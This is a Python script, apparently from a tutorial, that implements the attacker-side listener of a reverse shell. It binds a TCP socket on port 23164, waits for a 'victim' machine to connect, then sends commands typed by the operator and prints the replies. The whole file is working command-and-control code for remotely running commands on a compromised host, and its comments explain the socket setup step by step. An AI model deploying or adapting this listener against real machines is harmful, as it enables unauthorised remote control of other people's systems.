# Socket allows us to initiate an internet connection between 2 machines
import socket
import time


class Server:

    def __init__(self):
        # socket.AF_INET -> tells our program that it's ipv4
        # socket.SOCK_STREAM -> tells our program that we'll use TCP
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addr = ''
        self.target = None

    def connection_handler(self):
        """
            Ensure the connection between the server and the client.
            When the connection has been properly calls the shell function
        """
        # To prevent the socket from being in a TIME_WAIT state use this flag
        # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state,
        # without waiting for its natural timeout to expire
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # socket.gethostname() so that the socket would be visible to the outside world.
        # If we had used s.bind(('localhost', 5555)) or s.bind(('127.0.0.1', 555))
        # we would still have a server socket
        # but one that was only visible within the same machine. s.bind(('', 5555))
        # specifies that the socket is reachable by any address the machine happens to have.
        self.server_socket.bind((socket.gethostbyname(socket.gethostname()), 23164))

        # We must start listening the incoming connection (VICTIM MACHINE)
        print('[+] Listening for the incoming connection')
        # Our program will be stuck on this part until the connection established
        # 1 mean that we will listen up to 1 connections
        self.server_socket.listen(2)
        # Once the VICTIM connect -> we retrieve the information of the connection
        self.target, self.addr = self.server_socket.accept()

        print(f'[+] Target connected from {str(self.addr)}')
        self.shell()
        self.server_socket.close()
        print('Socket server is closed.')

    def shell(self):
        """
          Listen to input, encode it in UTF-8 then send it to the client / receive the response (dummy)
        """
        with self.target as target:
            while True:
                command = input(f'shell#~{self.addr[0]}@{self.addr[1]}: ')
                if command == '':
                    command = "\n"
                elif command == 'exit':
                    break
                target.sendall(command.encode('utf-8'))

                data = target.recv(1024)
                print(data.decode('utf-8'))


if __name__ == '__main__':
    Server().connection_handler()
